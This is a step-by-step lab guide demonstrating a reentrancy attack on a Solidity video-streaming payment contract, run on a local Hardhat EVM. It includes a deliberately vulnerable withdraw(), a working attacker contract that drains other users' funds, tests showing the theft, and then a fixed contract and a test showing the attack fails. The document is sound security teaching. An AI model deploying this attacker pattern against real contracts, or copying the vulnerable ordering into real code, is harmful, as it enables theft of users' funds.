# Scenario 1 — Reentrancy on `withdraw()`

> Execution guide. Follow the steps top to bottom. All paths are relative to
> `P2P App/contract/`. Commands are copy-paste ready.

This scenario demonstrates the classic reentrancy vulnerability (the same class as
the 2016 DAO hack) against the `withdraw()` function of `VideoStreaming`. An
attacker drains **the entire contract balance** — including other owners' earnings —
even though they were only owed a small amount.

## Prerequisites (once)

```bash
cd "P2P App/contract"
npm install
npx hardhat compile
```

No local node is required for this scenario — the attack runs on the in-process
Hardhat EVM via `npx hardhat test`.

---

## 1. Concepts

- **Reentrancy** — a contract makes an external call (sending ETH) *before* it
  finishes updating its own state. If the receiver is a contract, its
  `receive()`/`fallback()` can call back into the original function while the old
  state is still in place, repeating the operation many times.
- **Checks-Effects-Interactions (CEI)** — the safe ordering: first check
  requirements, then update state (effects), and only then make external calls
  (interactions). Reentrancy is possible when *interactions* happen before *effects*.
- **`.call{value: x}("")` vs `.transfer`** — `.transfer` forwards only 2300 gas
  (not enough to re-enter), while `.call` forwards all remaining gas, which is
  exactly what a reentrant attack needs.
- **Custodial context** — in peer-play the server holds users' keys, but the
  blockchain node is public: the attacker deploys their own contract and calls
  `VideoStreaming` directly over JSON-RPC, bypassing the backend entirely.

---

## 2. Vulnerable code

Create **`contracts/VideoStreamingReentrancyVuln.sol`**. It is the base contract
with the `withdraw()` ordering broken: the ETH is sent **before** the balance is
zeroed, and it uses `.call` (all gas forwarded).

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

contract VideoStreamingReentrancyVuln {
    struct Video { string ipfsHash; address owner; uint256 price; bool isAvailable; }

    mapping(string => Video) public videos;
    mapping(address => uint256) public balances;
    mapping(string => mapping(address => bool)) public videoPurchasers;

    event VideoUploaded(string ipfsHash, address owner, uint256 price);
    event VideoPurchased(string ipfsHash, address buyer);

    function uploadVideo(string memory _ipfsHash, uint256 _price) public {
        require(videos[_ipfsHash].owner == address(0), "Video already exists");
        videos[_ipfsHash] = Video(_ipfsHash, msg.sender, _price, true);
        emit VideoUploaded(_ipfsHash, msg.sender, _price);
    }

    function purchaseVideo(string memory _ipfsHash) public payable {
        Video storage video = videos[_ipfsHash];
        require(video.isAvailable, "Video is not available");
        require(msg.value >= video.price, "Insufficient payment");
        balances[video.owner] += msg.value;
        videoPurchasers[_ipfsHash][msg.sender] = true;
        emit VideoPurchased(_ipfsHash, msg.sender);
    }

    // VULNERABLE: interaction (send ETH) happens BEFORE the effect (zeroing balance)
    function withdraw() public {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "No funds to withdraw");

        (bool ok, ) = payable(msg.sender).call{value: amount}("");  // <-- external call first
        require(ok, "Transfer failed");

        balances[msg.sender] = 0;                                    // <-- state updated too late
    }
}
```

**Why it's exploitable:** when `withdraw()` sends ETH to the attacker's contract,
the attacker's `receive()` runs *while `balances[attacker]` is still non-zero*. It
calls `withdraw()` again, which reads the same non-zero balance and sends another
payment. This repeats until the contract is empty.

---

## 3. Attack

### 3.1 Attacker contract

Create **`contracts/ReentrancyAttacker.sol`**:

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

interface IVideoStreaming {
    function uploadVideo(string memory _ipfsHash, uint256 _price) external;
    function withdraw() external;
}

contract ReentrancyAttacker {
    IVideoStreaming public target;
    uint256 public constant STEP = 1 ether; // == the amount the attacker is legitimately owed

    constructor(address _target) {
        target = IVideoStreaming(_target);
    }

    // Register a video owned by THIS contract so it can accrue a balance.
    function uploadVideo(string memory cid, uint256 price) external {
        target.uploadVideo(cid, price);
    }

    // Kick off the drain.
    function attack() external {
        target.withdraw();
    }

    // Re-enters while the target still has at least one payout left.
    receive() external payable {
        if (address(target).balance >= STEP) {
            target.withdraw();
        }
    }
}
```

### 3.2 Attack test

Create **`test/reentrancy.attack.test.js`**:

```javascript
const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Scenario 1 — Reentrancy (attack on vulnerable contract)", function () {
  it("drains the entire contract, not just the attacker's balance", async function () {
    const [deployer, honestOwner, buyerA, buyerB] = await ethers.getSigners();

    const VS = await ethers.getContractFactory("VideoStreamingReentrancyVuln");
    const vs = await VS.deploy();
    await vs.waitForDeployment();

    // Seed an HONEST owner's earnings: 5 ETH sitting in the contract for someone else.
    await vs.connect(honestOwner).uploadVideo("QmHonest", ethers.parseEther("5"));
    await vs.connect(buyerB).purchaseVideo("QmHonest", { value: ethers.parseEther("5") });

    // Deploy the attacker and give it a legitimate 1 ETH balance.
    const Attacker = await ethers.getContractFactory("ReentrancyAttacker");
    const attacker = await Attacker.deploy(await vs.getAddress());
    await attacker.waitForDeployment();
    await attacker.uploadVideo("QmEvil", ethers.parseEther("1"));
    await vs.connect(buyerA).purchaseVideo("QmEvil", { value: ethers.parseEther("1") });

    const contractBefore = await ethers.provider.getBalance(await vs.getAddress());
    const attackerBefore = await ethers.provider.getBalance(await attacker.getAddress());
    console.log("Contract balance before:  ", ethers.formatEther(contractBefore), "ETH");
    console.log("Attacker legitimately owed: 1.0 ETH");
    console.log("Attacker contract before: ", ethers.formatEther(attackerBefore), "ETH");

    // === THE ATTACK ===
    await attacker.attack();

    const contractAfter = await ethers.provider.getBalance(await vs.getAddress());
    const attackerAfter = await ethers.provider.getBalance(await attacker.getAddress());
    console.log("Contract balance after:   ", ethers.formatEther(contractAfter), "ETH");
    console.log("Attacker contract after:  ", ethers.formatEther(attackerAfter), "ETH  <-- stole 6x");

    expect(attackerAfter).to.equal(ethers.parseEther("6")); // 1 owed + 5 stolen
    expect(contractAfter).to.equal(0n);
  });
});
```

### 3.3 Run it

```bash
npx hardhat test test/reentrancy.attack.test.js
```

**Expected output (successful attack):**

```
  Scenario 1 — Reentrancy (attack on vulnerable contract)
Contract balance before:   6.0 ETH
Attacker legitimately owed: 1.0 ETH
Attacker contract before:  0.0 ETH
Contract balance after:    0.0 ETH
Attacker contract after:   6.0 ETH  <-- stole 6x
    ✔ drains the entire contract, not just the attacker's balance
```

The attacker was owed 1 ETH but walked away with 6 ETH — the honest owner's 5 ETH
was drained.

> 📸 **Screenshot here (successful attack):** capture the terminal showing
> "Contract balance after: 0.0 ETH" and "Attacker contract after: 6.0 ETH".
> `![successful attack](../screenshots/1-reentrancy-attack.png)`

---

## 4. Mitigation

Create **`contracts/VideoStreamingReentrancyFixed.sol`** — identical to the
vulnerable contract except `withdraw()` follows Checks-Effects-Interactions **and**
adds a `nonReentrant` guard:

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

contract VideoStreamingReentrancyFixed {
    struct Video { string ipfsHash; address owner; uint256 price; bool isAvailable; }

    mapping(string => Video) public videos;
    mapping(address => uint256) public balances;
    mapping(string => mapping(address => bool)) public videoPurchasers;

    bool private locked; // reentrancy guard flag

    event VideoUploaded(string ipfsHash, address owner, uint256 price);
    event VideoPurchased(string ipfsHash, address buyer);

    modifier nonReentrant() {
        require(!locked, "ReentrancyGuard: reentrant call");
        locked = true;
        _;
        locked = false;
    }

    function uploadVideo(string memory _ipfsHash, uint256 _price) public {
        require(videos[_ipfsHash].owner == address(0), "Video already exists");
        videos[_ipfsHash] = Video(_ipfsHash, msg.sender, _price, true);
        emit VideoUploaded(_ipfsHash, msg.sender, _price);
    }

    function purchaseVideo(string memory _ipfsHash) public payable {
        Video storage video = videos[_ipfsHash];
        require(video.isAvailable, "Video is not available");
        require(msg.value >= video.price, "Insufficient payment");
        balances[video.owner] += msg.value;
        videoPurchasers[_ipfsHash][msg.sender] = true;
        emit VideoPurchased(_ipfsHash, msg.sender);
    }

    // FIXED: effect (zero balance) BEFORE interaction, plus a reentrancy guard.
    function withdraw() public nonReentrant {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "No funds to withdraw");

        balances[msg.sender] = 0;                                    // effect first
        (bool ok, ) = payable(msg.sender).call{value: amount}("");   // interaction last
        require(ok, "Transfer failed");
    }
}
```

**What changed and why it works:**
- `balances[msg.sender] = 0;` is now executed **before** the external call, so a
  re-entrant `withdraw()` reads a zero balance and hits `require(amount > 0)`.
- The `nonReentrant` modifier is a second line of defense: any re-entrant call
  reverts immediately with `"ReentrancyGuard: reentrant call"`. Because the outer
  `withdraw()` checks `require(ok, "Transfer failed")`, that reverting re-entry
  makes the whole withdrawal revert — the attacker gets nothing.

---

## 5. Failed attack on the fixed code

The attacker contract from §3.1 targets the same `withdraw()` interface, so it works
unchanged. Create **`test/reentrancy.mitigation.test.js`**:

```javascript
const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Scenario 1 — Reentrancy (attack blocked by fixed contract)", function () {
  it("re-entry reverts and the contract keeps its funds", async function () {
    const [deployer, honestOwner, buyerA, buyerB] = await ethers.getSigners();

    const VS = await ethers.getContractFactory("VideoStreamingReentrancyFixed");
    const vs = await VS.deploy();
    await vs.waitForDeployment();

    await vs.connect(honestOwner).uploadVideo("QmHonest", ethers.parseEther("5"));
    await vs.connect(buyerB).purchaseVideo("QmHonest", { value: ethers.parseEther("5") });

    const Attacker = await ethers.getContractFactory("ReentrancyAttacker");
    const attacker = await Attacker.deploy(await vs.getAddress());
    await attacker.waitForDeployment();
    await attacker.uploadVideo("QmEvil", ethers.parseEther("1"));
    await vs.connect(buyerA).purchaseVideo("QmEvil", { value: ethers.parseEther("1") });

    const contractBefore = await ethers.provider.getBalance(await vs.getAddress());
    console.log("Contract balance before:", ethers.formatEther(contractBefore), "ETH");

    // The attack now reverts.
    await expect(attacker.attack()).to.be.revertedWith("Transfer failed");

    const contractAfter = await ethers.provider.getBalance(await vs.getAddress());
    console.log("Contract balance after: ", ethers.formatEther(contractAfter), "ETH  <-- untouched");

    expect(contractAfter).to.equal(contractBefore); // nothing drained
  });
});
```

### Run it

```bash
npx hardhat test test/reentrancy.mitigation.test.js
```

**Expected output (attack fails):**

```
  Scenario 1 — Reentrancy (attack blocked by fixed contract)
Contract balance before: 6.0 ETH
Contract balance after:  6.0 ETH  <-- untouched
    ✔ re-entry reverts and the contract keeps its funds
```

The re-entrant call is rejected, the whole `withdraw()` reverts, and the contract
balance is unchanged.

> 📸 **Screenshot here (failed attack):** capture the terminal showing the test
> passing with "Contract balance after: 6.0 ETH <-- untouched".
> `![failed attack](../screenshots/1-reentrancy-mitigated.png)`
